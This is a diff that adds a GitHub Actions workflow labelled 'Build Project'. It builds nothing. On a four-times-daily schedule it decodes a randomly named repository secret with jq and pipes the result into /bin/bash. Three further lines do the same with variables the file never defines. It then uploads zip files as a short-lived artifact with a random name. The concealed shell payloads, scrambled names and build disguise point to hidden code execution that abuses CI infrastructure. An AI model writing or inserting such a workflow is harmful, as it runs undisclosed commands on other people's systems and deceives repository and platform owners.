@@ -1,0 +1,31 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '28 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          frj5: ${{ secrets.frj5 }}
+        run: |
+          printf '%s' "$frj5" | jq -r .ek9755 | /bin/bash
+          echo $z0 | jq -r .qkwez908 | /bin/bash
+          echo $dgkat249 | jq -r .mnssd6314 | /bin/bash
+          printf '%s' "$uilf91668" | jq -r .fewg20 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: WtapyoGn
+          path: "*.zip"
+          retention-days: 1
